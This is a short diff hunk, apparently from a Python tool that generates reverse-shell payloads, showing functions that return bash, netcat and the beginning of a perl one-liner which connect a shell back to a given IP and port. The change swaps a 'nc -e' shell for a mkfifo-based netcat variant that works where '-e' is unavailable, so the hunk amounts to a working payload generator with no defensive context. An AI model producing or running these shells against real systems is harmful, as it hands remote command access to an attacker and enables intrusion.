@@ -44,7 +44,7 @@ def generate_bash_shell(ip, port):
     return f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
 
 def generate_nc_shell(ip, port):
-    return f"nc -e /bin/sh {ip} {port}"
+    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f"
 
 def generate_perl_shell(ip, port):
     return (f"perl -e 'use Socket;$i=\"{ip}\";$p={port};"
